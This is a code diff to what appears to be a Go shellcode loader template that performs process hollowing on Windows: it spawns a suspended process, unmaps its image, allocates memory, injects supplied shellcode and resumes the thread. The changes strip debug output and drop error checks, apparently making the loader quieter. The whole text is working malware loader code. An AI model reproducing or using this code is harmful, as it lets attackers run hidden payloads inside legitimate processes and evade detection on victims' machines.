@@ -81,7 +81,7 @@ func createProcess(processName string) *syscall.ProcessInformation {
 	return &pi
 }
 
-func readProcessAddr(hProcess uintptr, addr uintptr) (result uintptr, e error) {
+func readProcessAddr(hProcess uintptr, addr uintptr) (uintptr, error) {
     size := 8
 
     var numBytesRead uintptr
@@ -95,12 +95,10 @@ func readProcessAddr(hProcess uintptr, addr uintptr) (result uintptr, e error) {
 		uintptr(unsafe.Pointer(&numBytesRead)),
     )
 	if r == 0 {
-		e = err
-        return
+        return 0, err
 	}
 
-	result = uintptr(binary.LittleEndian.Uint64(data))
-    return
+	return uintptr(binary.LittleEndian.Uint64(data)), nil
 }
 
 func findProgramPath(filename string) (string, error) {
@@ -116,14 +114,12 @@ func ExecuteOrderSixtySix(shellcode []byte) {
     processName := "%s"
     process := createProcess(processName)
 
-    println("process created")
-
     // process & thread handles
     hProcess := uintptr(process.Process)
     hThread := uintptr(process.Thread)
 
     // get thread context
-    ctx := make([]uint8, 0x1000)
+    ctx := make([]uint8, 0x4d0)
     binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
     ctxPtr := unsafe.Pointer(&ctx[0])
 
@@ -131,17 +127,12 @@ func ExecuteOrderSixtySix(shellcode []byte) {
         panic(err)
     }
 
-    println("received thread context")
-
     /*
         https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
         https://bytepointer.com/resources/tebpeb64.htm
     */
     remoteRdx := binary.LittleEndian.Uint64(ctx[136:])
-    imageBaseAddr, err := readProcessAddr(hProcess, uintptr(remoteRdx + 16)); if err != nil {
-        panic(nil)
-    }
-
+    imageBaseAddr, _ := readProcessAddr(hProcess, uintptr(remoteRdx + 16));
     programPath, err := findProgramPath(processName); if err != nil {
         panic(err)
     }
@@ -163,9 +154,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
     r, _, err = NtUnmapViewOfSection.Call(
         hProcess,
         imageBaseAddr,
-    ); if r != 0 {
-        panic(err)
-    }
+    );
 
     /* allocating data */
     newBaseImage, _, err := VirtualAllocEx.Call(
@@ -216,9 +205,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
     }
 
     /* Resuming thread and execute payload */
-    r, _, err = ResumeThread.Call(
-        hThread,
-    ); if r == 0xfffffff {
+    r, _, err = ResumeThread.Call(hThread); if r == 0xfffffff {
         panic(err)
     }
 }
